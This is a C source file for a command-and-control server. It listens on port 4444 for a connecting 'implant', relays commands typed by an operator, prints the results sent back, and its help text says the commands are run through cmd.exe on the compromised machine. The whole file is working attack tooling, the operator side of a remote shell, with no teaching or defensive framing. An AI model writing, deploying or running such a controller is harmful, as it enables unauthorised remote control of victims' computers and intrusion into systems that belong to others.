#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <poll.h>
#include <signal.h>

#define PORT 4444
#define BUFFER_SIZE 65536
#define TIMEOUT_SEC 15

static int g_running = 1;
static int g_listen_fd = -1;

void handle_sig(int sig) {
    (void)sig;
    g_running = 0;
    if (g_listen_fd >= 0) {
        close(g_listen_fd);
        g_listen_fd = -1;
    }
}

void handle_client(int new_socket) {
    char buffer[BUFFER_SIZE];
    char output[BUFFER_SIZE];
    ssize_t n;
    struct pollfd fds[2];
    char host[INET6_ADDRSTRLEN];
    struct sockaddr_in addr;
    socklen_t alen = sizeof(addr);

    getpeername(new_socket, (struct sockaddr*)&addr, &alen);
    inet_ntop(AF_INET, &addr.sin_addr, host, sizeof(host));
    printf("[+] Client connected from %s\n", host);

    while (g_running) {
        fds[0].fd = STDIN_FILENO;
        fds[0].events = POLLIN;
        fds[1].fd = new_socket;
        fds[1].events = POLLIN;

        int ret = poll(fds, 2, TIMEOUT_SEC * 1000);

        if (ret < 0) {
            if (!g_running) break;
            perror("poll");
            break;
        }

        if (ret == 0) {
            /* Send a heartbeat ping to keep connection alive */
            write(new_socket, "PING\n", 5);
            continue;
        }

        /* Client sent output */
        if (fds[1].revents & POLLIN) {
            memset(output, 0, sizeof(output));
            n = read(new_socket, output, sizeof(output) - 1);
            if (n <= 0) {
                printf("\n[-] Client disconnected.\n");
                break;
            }
            output[n] = '\0';
            /* Strip trailing newlines for clean display */
            size_t slen = strlen(output);
            while (slen > 0 && (output[slen-1] == '\n' || output[slen-1] == '\r'))
                output[--slen] = '\0';

            printf("\n[Output]:\n%s\n\n", output);
        }

        /* User typed a command */
        if (fds[0].revents & POLLIN) {
            memset(buffer, 0, sizeof(buffer));
            n = read(STDIN_FILENO, buffer, sizeof(buffer) - 1);
            if (n <= 0) break;
            buffer[n] = '\0';

            /* Remove trailing newline but send one with the command */
            size_t blen = strlen(buffer);
            while (blen > 0 && (buffer[blen-1] == '\n' || buffer[blen-1] == '\r'))
                buffer[--blen] = '\0';

            if (blen == 0) continue;

            if (strcmp(buffer, "exit") == 0 || strcmp(buffer, "quit") == 0) {
                printf("[*] Closing connection.\n");
                write(new_socket, "EXIT\n", 5);
                break;
            }

            if (strcmp(buffer, "help") == 0) {
                printf("Commands are sent to the implant and executed via cmd.exe /c\n");
                printf("Special: exit/quit = close, kill = terminate implant\n");
                continue;
            }

            /* Send command with newline so beacon knows it's complete */
            char sendbuf[BUFFER_SIZE];
            snprintf(sendbuf, sizeof(sendbuf), "%s\n", buffer);
            write(new_socket, sendbuf, strlen(sendbuf));
        }
    }

    close(new_socket);
}

int main() {
    int new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);

    signal(SIGINT, handle_sig);
    signal(SIGTERM, handle_sig);
    signal(SIGPIPE, SIG_IGN);

    if ((g_listen_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket");
        exit(1);
    }

    setsockopt(g_listen_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(g_listen_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind");
        exit(1);
    }

    if (listen(g_listen_fd, 3) < 0) {
        perror("listen");
        exit(1);
    }

    printf("[C2] Listening on 0.0.0.0:%d\n", PORT);
    printf("[C2] Waiting for implant...\n");

    while (g_running) {
        new_socket = accept(g_listen_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
        if (new_socket < 0) {
            if (!g_running) break;
            perror("accept");
            continue;
        }

        handle_client(new_socket);
        printf("[C2] Implant disconnected. Waiting for next connection...\n");
    }

    if (g_listen_fd >= 0) close(g_listen_fd);
    printf("[C2] Server stopped.\n");
    return 0;
}
